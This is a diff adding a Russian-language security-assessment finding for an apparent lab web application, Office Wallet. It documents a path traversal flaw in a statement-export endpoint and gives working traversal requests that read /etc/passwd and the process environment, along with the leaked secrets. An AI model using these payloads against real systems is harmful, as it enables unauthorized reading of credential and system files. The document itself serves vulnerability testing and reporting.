@@ -1,0 +1,23 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-09
+################################################################################################
+== 4. OW-09: чтение любых файлов (path traversal) ==
+    · Фильтр имени файла снимает ../ только один раз, результат после filepath.Join
+    · не проверяется (handlers_shop.go:449-461) — значит путь собирается любой.
+    · Читаем систему и самое ценное — окружение процесса, там ключи и DSN:
+    → POST /statements/export  filename=../../../../etc/passwd
+    ← HTTP 200 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man...
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    → POST /statements/export  filename=../../../../proc/1/environ
+    ← HTTP 200 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.HOSTNAME=4a1860a837ac.PUBLIC_BASE=http://localhost:18081.PAYMENT_KEY=office-wallet-pay-key.DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable.MAIL_PORT=1025...
+    PAYMENT_KEY=office-wallet-pay-key
+    DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    SESSION_KEY=office-wallet-session-key
+    ┌─ АРТЕФАКТ · OW-09 · чтение файлов контейнера через traversal
+    │ POST filename=../../../../etc/passwd → HTTP 200; ответ: root:x:0:0:root:/root:/bin/bash | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    │ POST filename=../../../../proc/1/environ → найдено: PAYMENT_KEY=office-wallet-pay-key | DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable | SESSION_KEY=office-wallet-session-key
+    └─
+[+] произвольные файлы контейнера читаются через export
